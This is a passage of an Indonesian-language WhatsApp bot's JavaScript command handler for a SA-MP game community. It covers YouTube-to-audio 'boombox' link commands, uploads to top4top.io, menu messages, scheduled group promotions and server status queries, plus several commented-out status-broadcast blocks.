        const url = `https://p.oceansaver.in/ajax/download.php?format=${format}&url=${encodeURIComponent(youtubeUrl)}&api=dfcb6d76f2f6a9894gjkege8a4ab232222`;

        const response = await axios.get(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        });

        if (!response.data || !response.data.success) return conn.sendMessage(m.chat, { text: '❌ Gagal mengunduh audio. Coba lagi nanti.' }, { quoted: blonet });

        const { id, title, info } = response.data;

        while (true) {
            const progress = await axios.get(`https://p.oceansaver.in/ajax/progress.php?id=${id}`, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });

            if (progress.data && progress.data.success && progress.data.progress === 1000) {
                const downloadUrl = progress.data.download_url;

                // Kirim audio ke pengguna
                await pablo.sendMessage(m.chat, {
                    audio: { url: downloadUrl },
                    mimetype: 'audio/mpeg',
                    fileName: `${title}.mp3`
                }, { quoted: blonet });

                await pablo.sendMessage(m.chat, {
                    text: `🎧 Audio *${title}* telah berhasil diunduh dan siap untuk dinikmati! 🎶`
                }, { quoted: blonet });

                // Upload ke top4top.io
                reply('📤 Uploading to top4top.io...');
                let audioBuffer = await (await axios.get(downloadUrl, { responseType: 'arraybuffer' })).data;
                let link = await top4top(audioBuffer);

                // Kirim link download dari top4top.io
                await pablo.sendMessage(m.chat, {
                    text: `🔗 *Link Boombox:*\n${link}\n💾 *Note:*\n*Gunakan http untuk dipakai dalam SA-MP/boombox*`
                }, { quoted: blonet });

                break;
            }
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    } catch (error) {
        console.error('Error:', error);
        pablo.sendMessage(m.chat, { text: '⚠️ Terjadi kesalahan saat mencoba mengunduh audio. Mohon coba lagi nanti.' }, { quoted: blonet });
    }
}
break;*/case 'bblink':
case 'boomboxlink': {
    if (args.length === 0)
        return pablo.sendMessage(m.chat, { text: `🎶 Masukkan URL YouTube yang ingin diunduh, misalnya:\n${prefix + command} https://www.youtube.com/watch?v=dQw4w9WgXcQ` }, { quoted: blonet });

    const youtubeUrl = args[0];
    if (!youtubeUrl.includes('youtube.com') && !youtubeUrl.includes('youtu.be'))
        return reply('❌ Harap masukkan URL YouTube yang valid.');

    try {
        reply('⏳ Memproses link YouTube...');
        // === GUNAKAN API KAMU SENDIRI ===
        const apiRes = await axios.get(`https://installer.pablocloud.biz.id/api/yt-srv.php?url=${encodeURIComponent(youtubeUrl)}`);
        const data = apiRes.data;

        if (data.error || !data.result) {
            return pablo.sendMessage(m.chat, { text: '❌ Gagal mengunduh audio. Coba lagi nanti.' }, { quoted: blonet });
        }

        const audioUrl = data.result;
        const title = data.title || 'Audio Boombox';

        // Kirim audio langsung
        await pablo.sendMessage(m.chat, {
            audio: { url: audioUrl },
            mimetype: 'audio/mpeg',
            fileName: `${title}.mp3`
        }, { quoted: blonet });

        /*await pablo.sendMessage(m.chat, {
            text: `🎧 Audio *${title}* telah berhasil diunduh dan siap untuk dinikmati! 🎶`
        }, { quoted: blonet });*/

        // Upload ke top4top.io
        //reply('📤 Uploading to top4top.io...');
        let audioBuffer = await (await axios.get(audioUrl, { responseType: 'arraybuffer' })).data;
        let link = (await top4top(audioBuffer)).replace(/^https:/, 'http:');

        /*await pablo.sendMessage(m.chat, {
            text: `🔗 *Link Boombox:*\n${link}\n💾 *Note:*\n*Gunakan http untuk dipakai dalam SA-MP/boombox*`
        }, { quoted: blonet });*/
        let content = {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },

      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: "🔗 *Link Boombox:*\n" + link + "\n"
        }),

        footer: proto.Message.InteractiveMessage.Footer.create({
          text: "💾 *Note:*\n*Gunakan http untuk dipakai dalam SA-MP/boombox*"
        }),

        header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false
        }),

        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                display_text: "Copy Link",
                id: "99999",
                copy_code: link
              })
            }
          ]
        })
      })
    }
  }
}

let msg = generateWAMessageFromContent(
  m.chat,
  content,
  { quoted: blonet }
)

await pablo.relayMessage(
  msg.key.remoteJid,
  msg.message,
  { messageId: msg.key.id }
)

    } catch (error) {
        console.error('Error:', error);
        pablo.sendMessage(m.chat, { text: '⚠️ Terjadi kesalahan saat mencoba mengunduh audio. Mohon coba lagi nanti.' }, { quoted: blonet });
    }
}
break;

/*case 'debugmedia': {
    const { quoted, message } = m;
    let chatId = m.chat;

    const ctx = message?.extendedTextMessage?.contextInfo || null;
    const quotedMessage = ctx?.quotedMessage || null;

    const mainType = Object.keys(message)[0] || 'Tidak ada';
    const quotedType = quotedMessage ? Object.keys(quotedMessage)[0] : 'Tidak ada';

    const mimeAudio = quotedMessage?.audioMessage?.mimetype || '';
    const mimeDoc = quotedMessage?.documentMessage?.mimetype || '';
    const mimetype = mimeAudio || mimeDoc || '';

    let debugText = '🧪 *DEBUG MEDIA INFORMATION*\n\n';

    debugText += `• *Tipe Pesan Utama*: ${mainType}\n`;
    debugText += `• *Apakah Ada quotedMessage?*: ${quotedMessage ? '✅ ADA' : '❌ TIDAK'}\n`;
    debugText += `• *Tipe Pesan Quoted*: ${quotedType}\n`;
    debugText += `• *mimetype audioMessage*: ${mimeAudio || '-'}\n`;
    debugText += `• *mimetype documentMessage*: ${mimeDoc || '-'}\n`;
    debugText += `• *MIME Digunakan*: ${mimetype || 'Tidak terdeteksi'}\n\n`;

    if (!mimetype.includes('audio/mpeg')) {
        debugText += '⚠️ *Bukan audio/mp3 atau mimetype tidak cocok.*\n';
    } else {
        debugText += '✅ *Audio MP3 terdeteksi, siap diproses.*\n';
    }

    await pablo.sendMessage(chatId, { text: debugText }, { quoted: m });
}
break;*/
                
case 'bbaudio':
case 'createbb':
case 'boomboxaudio': {
    const { quoted, message } = m;
    let chatId = m.chat;

    const ctx = message?.extendedTextMessage?.contextInfo || null;
    const quotedMessage = ctx?.quotedMessage || null;

    // Debug info tipe pesan
    const mainType = Object.keys(message)[0] || 'Tidak ada';
    const quotedType = quotedMessage ? Object.keys(quotedMessage)[0] : 'Tidak ada';

    // Cek mimetype dari audioMessage atau documentMessage di quotedMessage
    const mimeAudio = quotedMessage?.audioMessage?.mimetype || '';
    const mimeDoc = quotedMessage?.documentMessage?.mimetype || '';
    const mimetype = mimeAudio || mimeDoc || '';

    // Kirim debug info ke chat (opsional, bisa di-comment)
    /*await pablo.sendMessage(chatId, { text:
        `🧪 *DEBUG MEDIA INFORMATION*\n\n` +
        `• *Tipe Pesan Utama*: ${mainType}\n` +
        `• *Apakah Ada quotedMessage?*: ${quotedMessage ? '✅ ADA' : '❌ TIDAK'}\n` +
        `• *Tipe Pesan Quoted*: ${quotedType}\n` +
        `• *mimetype audioMessage*: ${mimeAudio || '-'}\n` +
        `• *mimetype documentMessage*: ${mimeDoc || '-'}\n` +
        `• *MIME Digunakan*: ${mimetype || 'Tidak terdeteksi'}\n\n` +
        (mimetype.startsWith('audio/') ? '✅ *Audio MP3 terdeteksi, siap diproses.*' : '⚠️ *Bukan audio/mp3 atau mimetype tidak cocok.*')
    }, { quoted: m });*/

    if (!mimetype.startsWith('audio/')) 
        return reply(`❌ *Balas audio MP3 dengan caption:* ${prefix + command}`);

    try {
        reply('📥 Mendownload audio...');
        // Download langsung dari quoted, karena media ada di situ
        const audioMsg = quotedMessage.audioMessage || quotedMessage.documentMessage;
        const stream = await downloadContentFromMessage(audioMsg, 'audio');

        const chunks = [];
        for await (const chunk of stream) {
            chunks.push(chunk);
        }
        const buffer = Buffer.concat(chunks);

        reply('📤 Mengupload ke top4top.io...');
        let link = (await top4top(buffer)).replace(/^https:/, 'http:');

        /*await pablo.sendMessage(chatId, {
            text: `🔗 *Link Boombox:*\n${link}\n💾 *Note:*\n*Gunakan http untuk dipakai dalam SA-MP/boombox*`
        }, { quoted: blonet });*/
        let content = {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },

      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: "🔗 *Link Boombox:*\n" + link + "\n"
        }),

        footer: proto.Message.InteractiveMessage.Footer.create({
          text: "💾 *Note:*\n*Gunakan http untuk dipakai dalam SA-MP/boombox*"
        }),

        header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false
        }),

        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                display_text: "Copy Link",
                id: "99999",
                copy_code: link
              })
            }
          ]
        })
      })
    }
  }
}

let msg = generateWAMessageFromContent(
  m.chat,
  content,
  { quoted: blonet }
)

await pablo.relayMessage(
  msg.key.remoteJid,
  msg.message,
  { messageId: msg.key.id }
)

    } catch (err) {
        console.error(err);
        await pablo.sendMessage(chatId, {
            text: '❌ Gagal mengupload audio. Pastikan kamu membalas audio yang benar.'
        }, { quoted: blonet });
    }
}
break;

/*case 'testbb': {
    const axios = require('axios');
    const cheerio = require('cheerio');
    const FormData = require('form-data');
    const { fromBuffer } = require('file-type');
    const fs = require('fs');

    async function upload(mediaBuffer) {
        try {
            let mime = await fromBuffer(mediaBuffer);
            if (!mime) throw new Error("Gagal mendeteksi tipe file.");

            let form = new FormData();
            form.append('file_0_', mediaBuffer, {
                filename: `file-${Date.now()}.${mime.ext}`,
                contentType: mime.mime
            });
            form.append('submitr', '[ Upload ]');

            let response = await axios.post('https://top4top.io/index.php', form, {
                headers: {
                    ...form.getHeaders(),
                },
            });

            let $ = cheerio.load(response.data);

            // Cari link dengan semua kemungkinan subdomain (h, i, k, dsb.)
            let link = $('a[href^="https://"][href*=".top4top.io"]').first().attr('href');

            if (!link) throw new Error("Gagal mendapatkan link hasil upload.");

            return link;
        } catch (error) {
            return `Upload gagal: ${error.message}`;
        }
    }

    try {
        let filePath = 'menu.mp3';
        if (!fs.existsSync(filePath)) throw new Error(`File ${filePath} tidak ditemukan.`);

        let media = fs.readFileSync(filePath);

        upload(media)
            .then((result) => {
                reply(result);
            })
            .catch((err) => {
                console.error(err);
                reply(`Terjadi kesalahan saat mengunggah file: ${err.message}`);
            });
    } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan membaca file: ${err.message}`);
    }
}
break;
      
case 'testup': {
    const axios = require('axios');
    const cheerio = require('cheerio');
    const FormData = require('form-data');
    const { fromBuffer } = require('file-type');
    const fs = require('fs');

    async function upload(media) {
    let mime = await fromBuffer(media)
    let form = new FormData()
    form.append('file_0_', media, `file-${Date.now()}.${mime.ext}`)
    form.append('submitr', '[ Upload ]')
    let { data } = await axios.post('https://top4top.io/index.php', form, {
        headers: {
            ...form.getHeaders()
        },
    })
    let result = []
    let $ = cheerio.load(data)
    let link = $('.index_info').find('.all_boxes').attr('value')
    
    return link
}

    let pler = fs.readFileSync('./menu.mp3');

    let res = await upload(pler)
    reply(res)
}
break;*/

           /* case 'bbyt':
            case 'boomboxyt': {
  if (args.length === 0) {
    pablo.sendMessage(msg.key.remoteJid, {
      text: `Cara penggunaan: \n.boomboxyt [url/link YouTube atau youtu.be]`
    }, { quoted: blonet });
    break;
  }

  const youtubeUrl = args[0];

  // Validasi URL
  if (!youtubeUrl.startsWith("http") || 
      (!youtubeUrl.includes("youtube.com") && !youtubeUrl.includes("youtu.be"))) {
    pablo.sendMessage(msg.key.remoteJid, {
      text: `Link tidak valid. Pastikan Anda memasukkan link YouTube yang benar.`
    }, { quoted: blonet });
    break;
  }

  try {
    // Log: Memulai proses
    reply('⏳ Memproses link YouTube...');

    let response = await axios(`https://pablo-network-rest-api.vercel.app/api/ytmp3`, {
      params: { url: youtubeUrl, key: 'pablo' },
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36' }
    });

    let musicData = response.data;

    if (musicData.metadata && musicData.media) {
      let { metadata, media } = musicData;
      const fileUrl = media['128kbps'].url;
      const fileName = `${metadata.title}.mp3`;

      // Upload ke server boombox
      // Mengunduh file musik
      const fileBuffer = await axios.get(fileUrl, { responseType: 'arraybuffer' });

      // Konversi Buffer ke Blob
      const fileBlob = new Blob([fileBuffer.data], { type: 'audio/mp3' });

      // Membuat form data untuk upload
      const formData = new FormData();
      formData.append('music', fileBlob, fileName);

      // Upload ke server Boombox
      const uploadResponse = await axios.post('https://boombox.pablonetwork.web.id/upload', formData, {
        headers: {
          'Content-Type': 'multipart/form-data'
        }
      });

      if (uploadResponse.data.success) {
        const uploadedLink = uploadResponse.data.url;

        // Kirim link hasil upload ke pengguna
        pablo.sendMessage(msg.key.remoteJid, {
          text: `✅ Musik berhasil diunggah ke Boombox!\n\n> 🎵 *Judul*:\n> ${metadata.title}\n\n> 🌐 *Link*:\n> ${uploadedLink}`,
        }, { quoted: blonet });

      } else {
        reply('❌ Gagal mengunggah musik ke Boombox.');
      }
    } else {
      reply('❌ API mengembalikan respons tidak valid. Musik tidak ditemukan atau gagal diunduh.');
    }

  } catch (err) {
    console.error('❌ Terjadi kesalahan:', err.message);
    reply('❌ Terjadi kesalahan saat memproses link YouTube.');
  }
}
break;*/

/*case "tagsw": {
if (!isOwner) return reply('Khusus Creator');
if (!text) return reply(`Example: ${prefix + command} Hello Or Reply Video/Image With Caption: ${prefix + command}`);
let mediaContent = null;
let msgOptions = {};
const BackgroundColor = ['#f68ac9', '#6cace4', '#f44336', '#4caf50', '#ffeb3b', '#9c27b0', '#0d47a1', '#03a9f4', '#9e9e9e', '#ff9800', '#000000', '#ffffff', '#008080', '#FFC0CB', '#A52A2A', '#FFA07A', '#FF00FF', '#D2B48C', '#F5DEB3', '#FF1493', '#B22222', '#00BFFF', '#1E90FF', '#FF69B4', '#87CEEB', '#20B2AA', '#8B0000', '#FF4500', '#48D1CC', '#BA55D3', '#00FF7F', '#008000', '#191970', '#FF8C00', '#9400D3', '#FF00FF', '#8B008B', '#2F4F4F', '#FFDAB9', '#BDB76B', '#DC143C', '#DAA520', '#696969', '#483D8B', '#FFD700', '#C0C0C0'];
const pickedColor = BackgroundColor[Math.floor(Math.random() * BackgroundColor.length)];
const jids = [m.sender, m.chat];
if (quoted) {
const mime = quoted.mtype || quoted.mediaType;
if (mime?.includes('image')) {
 mediaContent = await m.quoted.download();
 msgOptions = {
 image: mediaContent,
 caption: text || m.quoted.text || '',
 };
 } else if (mime?.includes('video')) {
 mediaContent = await m.quoted.download();
 msgOptions = {
 video: mediaContent,
 caption: text || m.quoted.text || '',
 };
 } else {
 msgOptions = {
 text: text || m.quoted.text || '',
 };
 }
 } else {
 msgOptions = {
 text: text,
 };
 }

 await reply('Memproses Tag Sw Ke Semua Grup🥵');
 return pablo.sendMessage("status@broadcast", msgOptions, {
 backgroundColor: pickedColor,
 textArgb: 0xffffffff,
 font: 0,
 statusJidList: await Object.values(await pablo.groupFetchAllParticipating()).flatMap(g => g.participants.map(a => a.id)),
 additionalNodes: [
 {
 tag: "meta",
 attrs: {},
 content: [
 {
 tag: "mentioned_users",
 attrs: {},
 content: jids.map((jid) => ({
 tag: "to",
 attrs: { jid: m.chat },
 content: undefined,
 })),
 },
 ],
 },
 ],
 });
}
break*/

/*case "mmk": {
    let groups = await pablo.groupFetchAllParticipating();
let allMembers = [];

for (let groupId in groups) {
    let metadata = await pablo.groupMetadata(groupId);
    let members = metadata.participants.map((a) => a.id);
    allMembers.push(...members);
}

reply(allMembers);

}
break;*/

/*case "tagsw2": {
    if (!isOwner) return reply('Khusus Creator');
    if (!text) return reply(`Example: ${prefix + command} Hello Or Reply Video/Image With Caption: ${prefix + command}`);

    let mediaContent = null;
    let msgOptions = {};
    const BackgroundColor = ['#f68ac9', '#6cace4', '#f44336', '#4caf50', '#ffeb3b', '#9c27b0', '#0d47a1', '#03a9f4', '#9e9e9e', '#ff9800', '#000000', '#ffffff'];
    const pickedColor = BackgroundColor[Math.floor(Math.random() * BackgroundColor.length)];

    if (quoted) {
        const mime = quoted.mtype || quoted.mediaType;
        if (mime?.includes('image')) {
            mediaContent = await m.quoted.download();
            msgOptions = { image: mediaContent, caption: text || m.quoted.text || '' };
        } else if (mime?.includes('video')) {
            mediaContent = await m.quoted.download();
            msgOptions = { video: mediaContent, caption: text || m.quoted.text || '' };
        } else {
            msgOptions = { text: text || m.quoted.text || '' };
        }
    } else {
        msgOptions = { text: text };
    }

    await reply('Memproses Tag Sw Ke Semua Grup🥵');

    // Ambil semua grup
    const allGroups = await pablo.groupFetchAllParticipating();
    const groupIds = Object.keys(allGroups);

    // Ambil semua peserta dari setiap grup
    let allParticipants = [];
    for (const groupId of groupIds) {
        const groupMetadata = await pablo.groupMetadata(groupId);
        allParticipants.push(...groupMetadata.participants.map(p => p.id));
    }

    return pablo.sendMessage("status@broadcast", msgOptions, {
        backgroundColor: pickedColor,
        textArgb: 0xffffffff,
        font: 0,
        statusJidList: groupIds, // Kirim ke semua grup
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: allParticipants.map((jid) => ({
                            tag: "to",
                            attrs: { jid },
                            content: undefined,
                        })),
                    },
                ],
            },
        ],
    });
}
break;*/

            case 'jpm24jam': {
  if (!isOwner) return reply('⚠️ Perintah ini hanya untuk Owner.');
  if (!isGroup) return reply('⚠️ Perintah ini hanya dapat digunakan dalam grup.');

  const [status, intervalTime] = text.split('|');
  const jpmData = getJpmData(); // Ambil data promosi saat ini

  // Konversi waktu
  const timeUnits = {
    s: 1000, // detik
    m: 60000, // menit
    h: 3600000, // jam
    d: 86400000, // hari
  };

  // Validasi waktu
  const timeMatch = intervalTime && intervalTime.match(/^(\d+)([smhd])$/);
  const duration = timeMatch ? parseInt(timeMatch[1]) * timeUnits[timeMatch[2]] : null;

  if (status === 'on' && duration) {
    if (jpmData[msg.key.remoteJid]) return reply('⚠️ Promosi sudah aktif di grup ini.');

    startPromotion(msg.key.remoteJid, duration, (groupId, message) => {
      pablo.sendMessage(groupId, { text: message });
    });

    reply(`✅ Promosi telah diaktifkan. Pesan akan dikirim setiap ${intervalTime}.`);
  } else if (status === 'off') {
    if (!jpmData[msg.key.remoteJid]) return reply('⚠️ Promosi tidak aktif di grup ini.');

    stopPromotion(msg.key.remoteJid);
    reply('✅ Promosi telah dimatikan.');
  } else {
    reply(`⚠️ Gunakan perintah:\n- *${prefix + command} on|1h* untuk menyalakan promosi.\n- *${prefix + command} off* untuk mematikan promosi.`);
  }
}
break;

case 'loadpromosi': {
    loadPromotions(sendPromotion);
    reply('✅ Berhasil Load');
}
break;

            /*case 'menu':
    const options = { timeZone: 'Asia/Jakarta', hour12: false };
    const date = new Date().toLocaleDateString('id-ID', options);
    const time = new Date().toLocaleTimeString('id-ID', options);
    const uptimeBotsrv = process.uptime();
    const uptimeTextBotsrv = `${Math.floor(uptimeBotsrv / 3600)} Jam, ${Math.floor((uptimeBotsrv % 3600) / 60)} Menit, ${Math.floor(uptimeBotsrv % 60)} Detik`;
    // Waktu Aktif Server
    const time2 = await si.time();
    const serverUptimeHours = Math.floor(time2.uptime / 3600);
    const serverUptimeMinutes = Math.floor((time2.uptime % 3600) / 60);

    const menuMessage = `
╭─────────────────────────────────
│                     === *BOT MAIN MENU* ===
├─────────────────────────────────
│                                            
│  *𝗠𝗮𝗶𝗻 𝗙𝗲𝗮𝘁𝘂𝗿𝗲𝘀*              
│   .wl        
│   .ucp
│   .ip
│   .server
│   .status
│   .player
│                                           
│  *𝗧𝗼𝗼𝗹𝘀*                             
│   .portscan
│   .ipinfo    
│   .pingscan
│   .samp
│   .mc
│            
│  *𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱*                        
│   .ytmp3
│   .ytsearch
│   .tiktok
│   .tiktoksearch 
│   .boomboxmenu
│   .boomboxyt
│   .boomboxlink
│                                           
│  *𝗢𝘁𝗵𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀*             
│   .menu           
│   .unwl
│   .unucp
│   .daftarwl
│   .daftarucp
│   .addowner
│   .addwl
│   .adducp
│   .addnumber
│   .delnumber
│   .addmoney
│   .addlevel
│   .addrubel
│   .delmoney
│   .dellevel
│   .delrubel
│   .setcs
│   .setadmin
│   .deladmin
│   .listadmin
│   .ban
│   .unban
│   .listban
│   .addakses wl
│   .addakses ucp
│   .addakses admin
│   .delakses wl
│   .delakses ucp
│   .delakes admin
│   .listakses all
│   .cekakun
│   .infoakun
│   .infobot
│                                            
╰─────────────────────────────────
│               === *Powered by PabloNetwork* ===         
│  📅 Tanggal: ${date}                        
│  🕒 Waktu: ${time} WIB          
│  ☁️ Uptime Server: ${serverUptimeHours} Jam ${serverUptimeMinutes} Menit
│  🚀 Uptime Bot: ${uptimeTextBotsrv}
╰─────────────────────────────────
`;

    reply(menuMessage); 
    const pl = 'menu.mp3';
    pablo.sendMessage(msg.key.remoteJid, {
        audio: fs.readFileSync(pl),
        fileName: 'menu.mp3',
        mimetype: 'audio/mp4',
        ptt: true,
    }, { quoted: blonet }).then(() => {
        console.log('File terkirim');
    }).catch(err => {
        console.error(err);
    });
    break;*/
                
case 'menu': {
    const buttons = [
  { buttonId: '.allmenu', buttonText: { displayText: '📋 Allmenu' }, type: 1 },
  { buttonId: '.script', buttonText: { displayText: '📒 Script Bot' }, type: 1 }
]
    let rank = isDeveloper ? 'Developer' : isOwner ? 'Owner' : isStaff ? 'Admin' : 'Warga';
    let akses = pablo.public ? 'Public' : 'Self';

    let dateObj = new Date(new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' }));
    let tanggal = `${dateObj.getDate()} - ${dateObj.toLocaleString('en-US', { month: 'short' })} - ${dateObj.getFullYear()}`;
    let jam = `${dateObj.getHours()}:${dateObj.getMinutes().toString().padStart(2, '0')} WIB`;

    let serverStatus = 'Offline';
    try {
        let res = await fetch(`https://pablo-network-rest-api.vercel.app/api/samp?key=pablo&host=${global.IpServer}&port=${global.PortServer}`);
        if (res.ok) serverStatus = 'Online';
    } catch (e) {
        serverStatus = 'Offline';
    }

    let menu = `*▢ Rank:* ${rank}
*▢ Developer Bot:* Pablo
*▢ Bot Permission:* ${akses}
*▢ Version Bot:* 9.0
*▢ Tanggal:* ${tanggal}
*▢ Jam:* ${jam}
*▢ Status Server:* ${serverStatus}

*— Main Features*
๑ .wl
๑ .ucp
๑ .infoakun
๑ .status
๑ .server
๑ .player
๑ .ip
๑ .sendverify

*— Boombox*
๑ .boomboxmenu
๑ .boomboxyt
๑ .boomboxlink
๑ .bbmenu
๑ .bbyt
๑ .bblink`;

    
    //reply(menu);
    await blov2(menu, buttons);

    /*pablo.sendMessage(msg.key.remoteJid, {
        audio: fs.readFileSync('menu.mp3'),
        fileName: 'menu.mp3',
        mimetype: 'audio/mp4',
        ptt: true,
    }, { quoted: blonet }).then(() => {
        console.log('File terkirim');
    }).catch(err => {
        console.error(err);
    });*/
}
break;
                
case 'allmenu': {
    if (!isDeveloper && !isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');
    let rank = isDeveloper ? 'Developer' : isOwner ? 'Owner' : isStaff ? 'Admin' : 'Warga';
    let akses = pablo.public ? 'Public' : 'Self';

    let dateObj = new Date(new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' }));
    let tanggal = `${dateObj.getDate()} - ${dateObj.toLocaleString('en-US', { month: 'short' })} - ${dateObj.getFullYear()}`;
    let jam = `${dateObj.getHours()}:${dateObj.getMinutes().toString().padStart(2, '0')} WIB`;

    let serverStatus = 'Offline';
    try {
        let res = await fetch(`https://pablo-network-rest-api.vercel.app/api/samp?key=pablo&host=${global.IpServer}&port=${global.PortServer}`);
        if (res.ok) serverStatus = 'Online';
    } catch (e) {
        serverStatus = 'Offline';
    }

    let menu = `*▢ Rank:* ${rank}
*▢ Developer Bot:* Pablo
*▢ Bot Permission:* ${akses}
*▢ Version Bot:* 9.0
*▢ Tanggal:* ${tanggal}
*▢ Jam:* ${jam}
*▢ Status Server:* ${serverStatus}

*— Main Features*
๑ .wl
๑ .ucp
๑ .infoakun
๑ .status
๑ .server
๑ .player
๑ .ip
๑ .sendverify

*— Tools*
๑ .portscan
๑ .ipinfo
๑ .pingscan
๑ .samp

*— Download*
๑ .ytmp3
๑ .ytsearch
๑ .play

*— Boombox*
๑ .boomboxmenu
๑ .boomboxyt
๑ .boomboxlink
๑ .bbaudio
๑ .bbmenu
๑ .bbyt
๑ .bblink
๑ .createbb

*— Groups*
๑ .hidetag
๑ .tagall
๑ .open
๑ .close
๑ .antilink
๑ .promote
๑ .demote
๑ .kick
๑ .linkgc
๑ .ongb
๑ .offgb
๑ .idgc

*— Cpanel*
๑ .cadp
๑ .deluser

*— Developer*
๑ .suspend

*— Owner*
๑ .addstaff
๑ .addowner
๑ .delstaff
๑ .delowner
๑ .setadmin
๑ .deladmin
๑ .listadmin
๑ .addakses admin
๑ .delakses admin
๑ .listakses all
๑ .public
๑ .self

*— Admin*
๑ .unwl
๑ .unucp
๑ .daftarwl
๑ .daftarucp
๑ .addwl
๑ .adducp
๑ .addnumber
๑ .delnumber
๑ .addlevel
๑ .addrubel
๑ .delmoney
๑ .dellevel
๑ .delrubel
๑ .setcs
๑ .ban
๑ .unban
๑ .listban
๑ .addakses wl
๑ .addakses ucp
๑ .delakses wl
๑ .delakses ucp
๑ .cekakun
๑ .cekucp
๑ .asendverify

*— Other Commands*
๑ .menu
๑ .allmenu
๑ .infobot`;

    //reply(menu);
    const but = [
  { buttonId: '.bbmenu', buttonText: { displayText: '🎧 Boombox Menu' }, type: 1 },
  { buttonId: '.script', buttonText: { displayText: '📒 Script Bot' }, type: 1 }
]
    //await ani(from, blonet);
    await blov2(menu, but);
   /*pablo.sendMessage(msg.key.remoteJid, {
        audio: fs.readFileSync('menu.mp3'),
        fileName: 'menu.mp3',
        mimetype: 'audio/mp4',
        ptt: true,
    }, { quoted: blonet }).then(() => {
        console.log('File terkirim');
    }).catch(err => {
        console.error(err);
    });*/
}
break;
                
case 'boomboxmenu':
case 'bbmenu': {
    let rank = isOwner ? 'Owner' : isStaff ? 'Admin' : 'Warga';
    let akses = pablo.public ? 'Public' : 'Self';

    let dateObj = new Date(new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta' }));
    let tanggal = `${dateObj.getDate()} - ${dateObj.toLocaleString('en-US', { month: 'short' })} - ${dateObj.getFullYear()}`;
    let jam = `${dateObj.getHours()}:${dateObj.getMinutes().toString().padStart(2, '0')} WIB`;

    let serverStatus = 'Offline';
    try {
        let res = await fetch(`https://pablo-network-rest-api.vercel.app/api/samp?key=pablo&host=${global.IpServer}&port=${global.PortServer}`);
        if (res.ok) serverStatus = 'Online';
    } catch (e) {
        serverStatus = 'Offline';
    }

    let menu = `*▢ Rank:* ${rank}
*▢ Developer Bot:* Pablo
*▢ Bot Permission:* ${akses}
*▢ Version Bot:* 9.0
*▢ Tanggal:* ${tanggal}
*▢ Jam:* ${jam}
*▢ Status Server:* ${serverStatus}

*— Boombox*
๑ .boomboxmenu
๑ .boomboxyt
๑ .boomboxlink
๑ .boomboxaudio
๑ .bbmenu
๑ .bbyt
๑ .bblink
๑ .bbaudio
๑ .createbb

*— YouTube Search*
๑ .ytsearch
๑ .yts`;

    //reply(menu); 
    const but = [
  { buttonId: '.script', buttonText: { displayText: '📒 Script Bot' }, type: 1 }
]
    //await ani(from, blonet);
    await blov2(menu, but);
    
    /*const pl = 'menu.mp3';
    pablo.sendMessage(msg.key.remoteJid, {
        audio: fs.readFileSync(pl),
        fileName: 'menu.mp3',
        mimetype: 'audio/mp4',
        ptt: true,
    }, { quoted: blonet }).then(() => {
        console.log('File terkirim');
    }).catch(err => {
        console.error(err);
    });*/
}
    break;
    
            case 'samp': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');
    if (!text) return reply(`Kirim perintah:\n${prefix+command} ip|port\n\nContoh penggunaan:\n${prefix+command} 127.0.0.1|7777`);
    if (!text.includes('|') && !text.split(" ").length === 3) return reply(`Kirim perintah:\n${prefix+command} ip|port\n\nContoh penggunaan:\n${prefix+command} 127.0.0.1|7777`);

    const [ip, port] = text.includes('|') ? text.split("|") : text.split(" ").slice(-2);
    let sampApiUrl = `https://pablo-network-rest-api.vercel.app/API/samp?key=pablo&host=${ip}&port=${port}`;

    try {
        let response = await axios(sampApiUrl);
        let sampInfo = response.data;

        let address = sampInfo.address;
        let hostname = sampInfo.hostname.trim();
        let gamemode = sampInfo.gamemode;
        let mapName = sampInfo.rules.mapname;
        let version = sampInfo.rules.version;
        let weather = sampInfo.rules.weather;
        let webUrl = sampInfo.rules.weburl;
        let worldTime = sampInfo.rules.worldtime;
        let maxPlayers = sampInfo.maxplayers;
        let playerOnline = sampInfo.online;

        let result = `
*${hostname}*

> IP:PORT:
> [ ${address}:${port} ]

> Gamemode:
> [ ${gamemode} ]

> Players Online:
> [ ${playerOnline} ]

> Max Players: 
> [ ${maxPlayers} ]

> Map: 
> [ ${mapName} ]

> Version: 
> [ ${version} ]

> Weather:
> [ ${weather} ]

> Url:
> [ ${webUrl} ]

> Time:
> [ ${worldTime} ]`;

        reply(result);
    } catch (error) {
        console.error(error);
        reply(`Unable To Connect ${ip}:${port}`);
    }
}
break;
                
